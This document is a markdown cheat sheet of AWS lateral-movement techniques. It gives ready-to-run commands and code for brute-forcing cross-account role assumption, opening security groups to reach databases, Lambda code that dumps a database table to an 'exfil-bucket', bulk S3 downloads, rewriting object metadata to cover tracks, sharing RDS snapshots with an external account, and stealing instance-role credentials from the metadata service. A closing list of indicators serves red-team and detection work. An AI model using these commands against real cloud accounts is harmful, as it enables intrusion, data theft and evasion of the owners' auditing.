# AWS Lateral Movement

Lateral movement in AWS involves accessing resources and data across the environment using obtained credentials and permissions.

## Cross-Account Access

### Assume Role Across Accounts

```bash
# List accessible roles across accounts
# If current identity has permissions in multiple accounts

for account in {000000000001..000000000100}; do
  aws sts assume-role \
    --role-arn "arn:aws:iam::$account:role/CommonRole" \
    --role-session-name test 2>/dev/null && echo "Account $account accessible"
done

# Once role assumed, access resources in target account
aws s3 ls --profile {assumedProfile}
```

### Cross-Account Resource Access

```bash
# S3 buckets with cross-account access
for bucket in $(aws s3 ls | awk '{print $3}'); do
  # Check bucket policy for cross-account principals
  aws s3api get-bucket-policy --bucket $bucket 2>/dev/null | \
    grep -q "arn:aws:iam::" && echo "CROSS-ACCOUNT: $bucket"
done

# Copy data from cross-account bucket
aws s3 cp s3://{crossAccountBucket}/{data} ./ --sse
```

## Service-to-Service Movement

### EC2 to RDS via Security Groups

```bash
# From compromised EC2, check database access
# Get VPC info
aws ec2 describe-security-groups --query 'SecurityGroups[].[GroupId,GroupName]' -o table

# Modify security group to allow database access
# If current security group has inbound rule allowing EC2

aws ec2 authorize-security-group-ingress \
  --group-id {dbSecurityGroupId} \
  --protocol tcp \
  --port 5432 \
  --source-security-group-id {ec2SecurityGroupId}

# Connect to RDS
psql -h {rdsEndpoint} -U {dbUser} -d {dbName}

# Query databases
SELECT * FROM sensitive_data;
```

### Lambda to Database

```bash
# Lambda may have permissions to query RDS
# And database credentials in environment

# Get function environment
aws lambda get-function-configuration \
  --function-name {functionName} | jq '.Environment.Variables'

# Extract database connection info
# Modify function to exfiltrate data

EXFIL_CODE='
import boto3
import json

def lambda_handler(event, context):
    rds = boto3.client("rds-data")
    
    response = rds.execute_statement(
        resourceArn="arn:aws:rds:{region}:{account}:db:{database}",
        secretArn="arn:aws:secretsmanager:{region}:{account}:secret:{secret}",
        database="{dbname}",
        sql="SELECT * FROM sensitive_table LIMIT 1000"
    )
    
    # Upload to S3
    s3 = boto3.client("s3")
    s3.put_object(
        Bucket="exfil-bucket",
        Key="data.json",
        Body=json.dumps(response["records"])
    )
    
    return {"status": "success"}
'
```

### ECS Task Access to Secrets

```bash
# From ECS task, may have access to Secrets Manager

# List available secrets
aws secretsmanager list-secrets

# Get database credentials
aws secretsmanager get-secret-value \
  --secret-id prod/database

# Use credentials to connect and extract data
```

## Data Exfiltration via Services

### S3 Bucket Compromise

```bash
# List all S3 buckets accessible to current role
aws s3 ls

# Check bucket contents
aws s3 ls s3://{bucketName}/ --recursive

# Download sensitive data
aws s3 sync s3://{bucketName}/sensitive/ ./data/

# Cover tracks by modifying object metadata
aws s3api copy-object \
  --copy-source {bucket}/{key} \
  --bucket {bucket} \
  --key {key} \
  --metadata-directive REPLACE \
  --metadata "accessed-by=maintenance"
```

### RDS Snapshot Access

```bash
# Create snapshot of database
aws rds create-db-snapshot \
  --db-instance-identifier {instanceId} \
  --db-snapshot-identifier "backup-$(date +%s)"

# Restore to new instance in accessible account
# Or share snapshot with external account

aws rds modify-db-snapshot-attribute \
  --db-snapshot-identifier {snapshotId} \
  --attribute-name restore \
  --values-to-add arn:aws:iam::{externalAccountId}:root

# External account can restore database
```

### DynamoDB Global Tables

```bash
# If have access to DynamoDB tables
# Can use global tables for cross-region/account replication

aws dynamodb describe-table --table-name {tableName}

# Create replica in different region
# Or enable streams for data extraction

aws dynamodb update-table \
  --table-name {tableName} \
  --stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```

## IAM Permission Discovery

```bash
# Enumerate all available permissions
aws iam list-users --query 'Users[].UserName' -o tsv | while read user; do
  echo "=== User: $user ==="
  
  # Inline policies
  aws iam list-user-policies --user-name $user --query 'PolicyNames' -o tsv
  
  # Attached policies
  aws iam list-attached-user-policies --user-name $user --query 'AttachedPolicies[].PolicyName' -o tsv
  
  # Group policies
  aws iam list-groups-for-user --user-name $user --query 'Groups[].GroupName' -o tsv
done

# Find service principals with dangerous permissions
aws iam list-roles --query 'Roles[].RoleName' -o tsv | while read role; do
  POLICIES=$(aws iam list-attached-role-policies --role-name $role \
    --query 'AttachedPolicies[?PolicyName==`AdministratorAccess`]')
  [ -n "$POLICIES" ] && echo "DANGEROUS: $role has AdministratorAccess"
done
```

## Metadata Service Lateral Movement

```bash
# From EC2 instance with role
# Use metadata service to get temporary credentials

curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ | head -1

CREDENTIALS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/RoleName)

# Extract and use credentials on internal network
export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.Token')

# Access resources accessible to instance role
aws s3 ls
```

## CloudTrail Enumeration for Reconnaissance

```bash
# Look for useful information in CloudTrail logs
aws cloudtrail lookup-events \
  --max-results 50 \
  --query 'Events[].{EventName,EventTime,Username}' -o table

# Find who accessed sensitive resources
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=ResourceName,AttributeValue=sensitive-bucket \
  --query 'Events[].{EventName,Username,CloudTrailEvent}' -o table
```

## Detection and Cleanup

```bash
# Before lateral movement, note current state
aws iam get-user
aws sts get-caller-identity

# During movement, minimize noise
# Use existing credentials rather than creating new ones

# After testing, clean up
# Remove created resources
aws iam delete-user --user-name BackdoorUser
aws s3 rm s3://staging-bucket --recursive

# Verify cleanup
aws cloudtrail lookup-events --max-results 1
```

## Key Indicators

- Cross-account role assumptions
- Unusual API calls to RDS or DynamoDB
- S3 bucket access patterns changing
- Snapshot creation and sharing
- New resources created (EC2, Lambda, etc.)
- Database connection from unusual source IPs
- Large data exports to external storage
